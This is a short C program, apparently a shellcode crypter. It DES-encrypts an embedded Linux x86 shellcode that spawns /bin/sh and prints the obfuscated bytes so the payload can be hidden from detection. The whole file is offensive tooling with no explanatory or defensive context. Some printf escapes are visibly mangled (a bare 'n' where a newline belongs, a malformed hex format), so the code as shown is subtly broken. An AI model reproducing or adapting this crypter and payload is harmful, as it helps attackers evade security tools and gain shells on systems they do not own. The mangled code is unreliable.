#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/des.h>
  
char*
Crypt(char *key, char *msg, int size)
{
    static char *shellcode;
    int num=0;
    DES_cblock keycopy;
    DES_key_schedule schedule;
    shellcode = (char *)malloc(size);
    memcpy(keycopy, key, 8);
    DES_set_odd_parity(&keycopy);
    DES_set_key_checked(&keycopy, &schedule);
    DES_cfb64_encrypt((unsigned char *)msg, (unsigned char *)shellcode,
    size, &schedule, &keycopy, &num, DES_ENCRYPT );
    return (shellcode);
}
 
int
main(int argc, char *argv[]) 
{
    char key[]="cryptpass";
    char shellcode[]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
    char *msg;
    int scSize = sizeof(shellcode)-1;
    msg = malloc(scSize);
    printf("Shellcode size:%d n",scSize);
    memcpy(msg,Crypt(key,shellcode,scSize), scSize);
    int c=0;
    printf("Encrypted text:n");
    for (c=0; c < scSize; c++)
    printf("\x%.2x", (unsigned char)msg[c]);
    printf("n");
    return (0);
}
